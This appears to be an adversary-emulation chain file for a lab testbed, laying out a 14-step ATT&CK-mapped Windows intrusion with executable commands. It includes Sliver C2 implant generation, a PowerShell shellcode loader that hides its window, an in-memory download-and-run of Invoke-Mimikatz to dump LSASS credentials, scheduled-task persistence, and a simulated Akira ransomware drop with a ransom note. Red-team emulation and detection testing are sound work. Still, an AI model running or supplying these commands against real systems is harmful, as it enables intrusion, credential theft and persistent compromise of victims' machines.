# Chain 095

**Testbed**: `env0` · **Steps**: 14 · **Tactics touched**: Command and Control, Initial Access, Execution, Defense Evasion, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001, T1105 |
| Initial Access | T1566.002 |
| Execution | T1059.001, T1620, T1204.002 |
| Defense Evasion | T1059.001, T1620 |
| Discovery | T1087.001 |
| Credential Access | T1003.001 |
| Persistence | T1053.005 |
| Impact | T1486 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build Shellcode for the Sliver implant (for Windows) | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution, Defense Evasion | T1059.001, T1620 | Simulate the victim executes a shellcode payload (Windows) | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1087.001 | User Context Verification | Sliver Executor |
| 6 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 7 | Command and Control | T1105 | Upload to Remote Path | Sliver Executor |
| 8 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable | Human |
| 9 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 10 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 11 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 12 | Credential Access | T1003.001 | Powershell Mimikatz | Powershell Executor |
| 13 | Persistence | T1053.005 | Powershell Cmdlet Scheduled Task | Powershell Executor |
| 14 | Impact | T1486 | Akira Ransomware drop Files with .akira Extension and Ransomnote | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build Shellcode for the Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-shellcode`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(shellcode-payload ?p - payload ?s - shellcode)`
- `(file-payload ?p - payload ?file - file)`
- `(bin-file ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim executes a shellcode payload (Windows)

- **UUID**: `simulate-execute-shellcode-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Defense Evasion
- **MITRE ID(s)**: T1059.001, T1620
- **Technique(s)**: Command and Scripting Interpreter: PowerShell, Reflective Code Loading

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, open a powershell and execute these scripts)

$s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
$c='using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
$p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
$h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `SAVE_PATH` | Saved path of the downloaded shellcode payload file | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(bin-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — User Context Verification

- **UUID**: `sliver-whoami`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1087.001
- **Technique(s)**: Account Discovery: Local Account


**Description**

The `whoami` command retrieves the current user identity of the system. It executes the command on the remote system and returns the username of the account that is currently logged in. This command includes flag for setting a timeout.

**Execution** (Sliver Executor)

```
whoami(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(local-account-info-known ?target - host)`

---

### Step 6 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 7 — Upload to Remote Path

- **UUID**: `sliver-upload`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1105
- **Technique(s)**: Ingress Tool Transfer

**Description**

The `upload <remote_path, data, is_ioc>` function writes data to the specified path on the remote file system. Parameters include remote_path (remote path), data (data to write), and is_ioc (data is an indicator of compromise).

**Execution** (Sliver Executor)

```
upload(session_id=#{executor}, remote_path=#{RemotePath}, data=#{Data}, is_ioc=#{IsIOC})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Data` | Data to write | — | yes |
| `IsIOC` | Data is an indicator of compromise | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 8 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable

- **UUID**: `simulate-execute-lnk-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Double-click a shortcut (.lnk) file whose target is:
#{EXE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 9 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 10 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 11 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 12 — Powershell Mimikatz

- **UUID**: `art-t1003_001-mimikatz-powershell`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
(PowerSploit variant). Requires elevated PowerShell context and outbound
HTTPS to the script host. See ART auto_generated_guid
66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.

**Execution** (Powershell Executor)

```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the command. | — | yes |
| `remote_script` | URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror). | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 13 — Powershell Cmdlet Scheduled Task

- **UUID**: `art-t1053_005-powershell-scheduled-task`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1053.005
- **Technique(s)**: Scheduled Task/Job: Scheduled Task

**Description**

Registers a scheduled task via the native `Register-ScheduledTask`
cmdlet. Uses `New-ScheduledTaskAction` / `-AtLogon` trigger /
`RunLevel Highest` principal so the task runs elevated as an
Administrator group member at each logon. Original ART hardcodes
`calc.exe`; parameterised. ART auto_generated_guid
af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd.

**Execution** (Powershell Executor)

```
$Action = New-ScheduledTaskAction -Execute "#{task_command}"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask "#{task_name}" -InputObject $Task
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to register the task. | — | yes |
| `task_name` | Name of the scheduled task. | AtomicTask | yes |
| `task_command` | Executable the scheduled task launches at logon. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 14 — Akira Ransomware drop Files with .akira Extension and Ransomnote

- **UUID**: `art-t1486-akira-ransomware-sim`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1486
- **Technique(s)**: Data Encrypted for Impact

**Description**

Simulates Akira ransomware post-encryption artefacts: writes 100
random-byte 1MB files with `.akira` extension to `C:\` and drops a
ransom note on the user's Desktop. Does not actually encrypt user
data — models the observable trail an incident responder would find.
Under aurora's "technique-attempted" positioning we accept this as
`data-encrypted` (the .akira files are the encrypted artefact from
the model's point of view). ART auto_generated_guid
ab3f793f-2dcc-4da5-9c71-34988307263f.

**Execution** (Powershell Executor)

```
1..#{file_count} | ForEach-Object {
  $out = New-Object byte[] 1073741
  (New-Object Random).NextBytes($out)
  [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
}
"Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
"Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to drop the .akira files and ransom note. | — | yes |
| `file_count` | Number of .akira artefact files to drop. | 100 | yes |
| `output_dir` | Target-side directory where .akira files are written. | C:\\Users\\Public | yes |
| `ransom_note_name` | Ransom-note filename dropped on the user's desktop. | akira_readme.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(data-encrypted ?d - data ?target - host)`

---
